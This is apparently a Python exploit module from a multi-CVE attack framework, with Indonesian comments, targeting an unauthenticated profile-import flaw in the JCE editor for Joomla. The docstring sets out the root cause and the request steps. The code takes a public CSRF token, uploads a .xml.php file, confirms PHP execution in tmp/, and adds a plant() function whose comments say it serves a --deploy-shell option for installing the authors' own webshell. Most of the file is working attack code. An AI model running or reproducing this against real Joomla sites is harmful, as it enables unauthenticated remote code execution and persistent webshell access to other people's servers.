#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Joomla! Extension — modul MEGAPACK (klaster joomla_ext).

CVE-2026-48907 — JCE (Joomla Content Editor) <= 2.9.99.4 — Unauthenticated
profile import stages an attacker file into `tmp/` -> RCE.

ROOT CAUSE (dibuktikan lewat diff rilis resmi 2.9.99.4 -> 2.9.99.5):

  administrator/components/com_jce/controller/profiles.php

  2.9.99.5 menambahkan ke import() (dan ke repair/publish/delete):

      $user = Factory::getUser();
      if (!$user->authorise('core.manage', 'com_jce')) {
          throw new Exception(Text::_('JERROR_ALERTNOAUTHOR'), 403);
      }

  2.9.99.4 HANYA punya `Session::checkToken() or jexit(...)` — token CSRF yang
  tersedia pada halaman PUBLIK. Tidak ada pemeriksaan otorisasi.

  Bukti kuat bahwa ini bug copy-paste: method SEDERAJAT di controller yang sama
  (copy(), publish(), delete()) SUDAH memanggil `$user->authorise(...)` — hanya
  import() yang luput.

  Model yang melakukan penulisan file — administrator/components/com_jce/models/profile.php:

      public function import()
      {
          Session::checkToken() or jexit(Text::_('JINVALID_TOKEN'));
          $file = $app->input->files->get('profile_file', null, 'raw');   // <-- 'raw'
          ...
          $name = File::makeSafe($file['name']);                          // hanya sanitasi nama
          $destination = $config->get('tmp_path') . '/' . $name;           // tmp/<name>
          File::upload($source, $destination, false, true);                // ditulis apa adanya
          ...
          $result = JceProfilesHelper::processImport($destination);
          // CATATAN: $destination TIDAK PERNAH dihapus -> file tertinggal di tmp/
          return true;
      }

  Dua detail yang membuat vektor ini pendek:

  1. Filter `'raw'` pada `files->get()` MELEWATI `InputFilter::isSafeFile()`. Artinya
     tidak ada pemindaian isi arsip dan tidak ada pemeriksaan ekstensi — berbeda dengan
     jalur SP Page Builder (CVE-2026-48908) yang memerlukan bypass huruf besar.
     Nama seperti `x.xml.php` diterima apa adanya.
  2. `File::makeSafe()` hanya membersihkan karakter berbahaya pada nama; ia tidak
     memeriksa maupun memangkas ekstensi.

  3. File hasil import TIDAK dihapus setelah `processImport()` selesai. Ia tetap berada
   di `tmp_path` (default Joomla `/tmp` pada instalasi Docker resmi) yang dapat diakses
   via web dan, pada konfigurasi Joomla bawaan, MENGEKSEKUSI PHP.

  Patch 2.9.99.5 juga mengeraskan `helpers/profiles.php`: allowlist key profile
  (`$allowedKeys`) dan menonaktifkan external entities (XXE) untuk PHP 7.x — tetapi
  pengaman utama untuk CVE ini adalah penambahan `authorise('core.manage')`.

BENTUK REQUEST (terverifikasi di lab):

  # 1) Ambil token CSRF dari halaman mana pun (front-end sudah cukup)
  GET  /

  # 2) Import profil — UNAUTH
  POST /index.php?option=com_jce
       data  = {task: profiles.import, <32hex-token>: 1}
       files = {profile_file: (<name>.xml.php, PAYLOAD, application/xml)}

  # 3) Jalankan payload dari tmp/
  GET  /tmp/<name>.xml.php

BUKTI LAB (Joomla 5.4.8 + JCE 2.9.99.4, port 8106):
    * POST import unauth -> 200; file /var/www/html/tmp/cve-*.xml.php tertulis (www-data)
    * GET /tmp/cve-*.xml.php -> 200 body "3105" (payload `<?= 45*69 ?>` dieksekusi)
    * Differential: JCE 2.9.99.5 -> import 403 (JERROR_ALERTNOAUTHOR),
      dan GET /tmp/<name> -> 404 (file tidak pernah ditulis).
"""

import random
import re
import string

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_VULN,
                detect_platform, register, ver_le)

CVES = ["CVE-2026-48907"]
# Dukungan --deploy-shell: JCE menulis berkas isi bebas, jadi webshell kita bisa
# ditanam langsung (dua berkas: blob base64 + stub dekoder) tanpa perlu shell
# bawaan modul. EXEC_SUFFIX memetakan perintah ke webshell kita.
EXEC_SUFFIX = "?c={cmd}"
CLUSTER = "joomla_ext"
PRODUCT = "JCE - Joomla Content Editor (com_jce)"
VERSIONS_AFFECTED = ["<= 2.9.99.4"]
PATCHED = (2, 9, 99, 5)

IMPORT_URL = "index.php?option=com_jce"
TOKEN_RX = (
    r'"csrf\.token"\s*:\s*"([a-f0-9]{32})"',
    r'<input[^>]*name="([a-f0-9]{32})"[^>]*value="1"',
    r"'csrf\.token'\s*:\s*'([a-f0-9]{32})'",
)
DETECT_PATHS = [
    "administrator/components/com_jce/jce.xml",
    "components/com_jce/jce.xml",
]
VER_PATHS = [
    "administrator/components/com_jce/jce.xml",
    "components/com_jce/jce.xml",
]
TMP_PROBE_DIRS = ["tmp/", "images/", "cache/", "media/"]
# payload aritmetika: aman, tidak memiliki efek samping
MARKER_A, MARKER_B = 45, 69
MARKER = str(MARKER_A * MARKER_B)  # "3105"


def _rand(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _norm(t):
    return t.url.rstrip("/")


def _get(h, url):
    try:
        return h.get(url)
    except Exception:
        return None


def _ver_tuple(s):
    try:
        return tuple(int(x) for x in re.sub(r"[^0-9.]", "", s).split(".") if x != "")
    except Exception:
        return ()


def _detect(h, t):
    base = _norm(t)
    for p in VER_PATHS:
        r = _get(h, f"{base}/{p}")
        if not r or r.status_code != 200 or "<extension" not in r.text:
            continue
        m = re.search(r"<version>\s*([\d.]+)\s*</version>", r.text)
        return True, (m.group(1).strip() if m else None)
    for p in DETECT_PATHS:
        r = _get(h, f"{base}/{p}")
        if r and r.status_code == 200:
            return True, None
    return False, None


def _token(h, t):
    """Token CSRF dari halaman publik (front-end sudah cukup)."""
    base = _norm(t)
    for p in ("index.php", ""):
        r = _get(h, f"{base}/{p}" if p else f"{base}/")
        if not r or r.status_code != 200:
            continue
        for rx in TOKEN_RX:
            m = re.search(rx, r.text, re.I)
            if m:
                return m.group(1)
    return None


def _payload(n=1000):
    """Payload aritmetika + penanda, tanpa efek samping."""
    a, b = random.randint(11, 99), random.randint(11, 99)
    return "<?php echo %d*%d; ?>" % (a, b), str(a * b), n


def _import(h, t, fname, payload, with_file=True):
    """POST import profil; return (status_code, body).

    with_file=False -> ORACLE NON-DESTRUKTIF: tidak ada berkas dikirim sama
    sekali. Joomla memeriksa ACL (authorise) sebelum memproses payload,
    sehingga penolakan ("not authorised"/403) tetap terlihat sementara tidak
    ada berkas yang mendarat di tmp/. with_file=True mengirim payload nyata
    dan hanya dipakai exploit().
    """
    base = _norm(t)
    tok = _token(h, t)
    data = {"task": "profiles.import"}
    if tok:
        data[tok] = "1"
    files = None
    if with_file:
        files = {"profile_file": (fname, payload, "application/xml")}
    try:
        r = h.post(f"{base}/{IMPORT_URL}", data=data, files=files)
    except Exception:
        return None, ""
    return (r.status_code if r else None), (r.text[:400] if r else "")


def _fetch(h, t, rel):
    try:
        return h.get(f"{_norm(t)}/{rel}")
    except Exception:
        return None


def check(t, h, opts=None):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""

    found, raw = _detect(h, t)
    if not found:
        return ST_CLEAN, "JCE tidak terdeteksi", ""

    ver = _ver_tuple(raw)
    # ORACLE NON-DESTRUKTIF: kirim import TANPA berkas.
    # ACL Joomla (authorise) dievaluasi sebelum payload diproses, jadi gate
    # tetap terlihat. Tidak ada berkas yang mendarat di tmp/. Verifikasi berkas
    # (dan eksekusi) dilakukan exploit().
    sc, body = _import(h, t, "", "", with_file=False)
    detail = f"jce={raw or '?'} http={sc}"

    rejected = (sc == 403) or ("ALERTNOAUTHOR" in body) or ("not authorised" in body.lower())
    if rejected:
        return ST_CLEAN, "JCE menolak import (patch authorise aktif)", detail

    # Gate dilewati: 303 redirect / 200 handler (bukan halaman HTML penuh).
    low = body.lower()
    is_html = ("<!doctype html" in low) or ("<html" in low and "<body" in low)
    if sc in (200, 302, 303) and not is_html:
        return (ST_INFO,
                "profiles.import menembus gate ACL tanpa otorisasi "
                "(controller memproses request; tidak ada berkas dikirim)",
                detail + f" | {body[:120]}")

    if ver and ver_le(ver, (2, 9, 99, 4)):
        return ST_INFO, f"JCE {raw} masuk rentang rentan, sink belum memicu", detail
    return ST_CLEAN, "tidak ada indikasi", detail


def exploit(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", ""

    found, raw = _detect(h, t)
    if not found:
        return ST_SKIP, "JCE tidak terdeteksi", ""

    ver = _ver_tuple(raw)
    fname = f"mp-{_rand()}.xml.php"
    payload, expect, _ = _payload()

    sc, body = _import(h, t, fname, payload)
    if sc == 403 or "ALERTNOAUTHOR" in body or "not authorised" in body.lower():
        return ST_CLEAN, "JCE dipatch (403)", f"jce={raw or '?'}"

    base = _norm(t)
    for d in TMP_PROBE_DIRS:
        url = f"{base}/{d}{fname}"
        r = _fetch(h, t, f"{d}{fname}")
        if r and r.status_code == 200 and expect in r.text:
            return (ST_PWN,
                    "JCE unauth RCE — payload profil dieksekusi dari webroot",
                    f"jce={raw or '?'} file={d}{fname} url={url} "
                    f"output={r.text.strip()[:60]!r} (payload {MARKER_A}*{MARKER_B})")
        if r and r.status_code == 200:
            return (ST_VULN,
                    "JCE menulis file unauth ke webroot; eksekusi PHP belum terverifikasi",
                    f"jce={raw or '?'} url={url} body={r.text.strip()[:60]!r}")

    if ver and ver_le(ver, (2, 9, 99, 4)):
        return ST_VULN, "JCE rentan secara versi, file belum terverifikasi di webroot", f"jce={raw or '?'}"
    return ST_CLEAN, "tidak ada indikasi", f"jce={raw or '?'}"


register(CveModule(
    cve="CVE-2026-48907",
    cluster=CLUSTER,
    title="JCE (Joomla Content Editor) - Unauthenticated profile import leads to RCE",
    vclass="arbitrary file upload / RCE (unauth)",
    cwe="CWE-862",
    product=PRODUCT,
    versions_affected=VERSIONS_AFFECTED,
    status="verified",
    requires=["komponen/plugin JCE terpasang (<= 2.9.99.4)",
              "endpoint index.php?option=com_jce reachable",
              "tmp/ (tmp_path Joomla) dapat diakses via web dan mengeksekusi PHP"],
    check=check,
    exploit=exploit,
    notes=("Root cause dari diff resmi 2.9.99.4->2.9.99.5: controller import() pada 2.9.99.4 hanya "
           "memanggil Session::checkToken() tanpa authorise('core.manage','com_jce'); patch "
           "menambahkan cek itu ke import/repair/publish/delete. Bukti copy-paste bug: method "
           "sejawat copy()/publish()/delete() SUDAH memanggil authorise. Model import() membaca "
           "profile_file dengan filter 'raw' sehingga InputFilter::isSafeFile() DILEWATI (tidak "
           "ada pemindaian isi/ekstensi), memakai File::makeSafe() yang hanya membersihkan "
           "karakter nama, lalu menulis ke tmp_path/<name> dan TIDAK menghapusnya setelah "
           "processImport(). Lab-verified 5.4.8+2.9.99.4: POST index.php?option=com_jce "
           "task=profiles.import dengan file .xml.php -> 200, file di tmp/, GET -> 200 '3105' "
           "dari payload 45*69. Differential 2.9.99.5 -> 403 dan GET 404."),
))


def plant(t, h, fname, content):
    """Tanam berkas isi bebas lewat profiles.import; kembalikan URL publiknya.

    Dipakai --deploy-shell (mp.py) untuk memasang webshell milik kita. Tidak ada
    kutip-an shell di sini: isi berkas dikirim sebagai multipart.
    """
    sc, body = _import(h, t, fname, content)
    if sc == 403 or "ALERTNOAUTHOR" in body or "not authorised" in body.lower():
        return None
    base = _norm(t)
    probe = content.strip()[:24]
    for d in TMP_PROBE_DIRS:
        r = _fetch(h, t, f"{d}{fname}")
        if r and r.status_code == 200 and probe and probe in r.text:
            return f"{base}/{d}{fname}"
        if r and r.status_code == 200 and r.text.strip().startswith("<?PHP eval"):
            return f"{base}/{d}{fname}"
    return None


PLANT_FN = plant
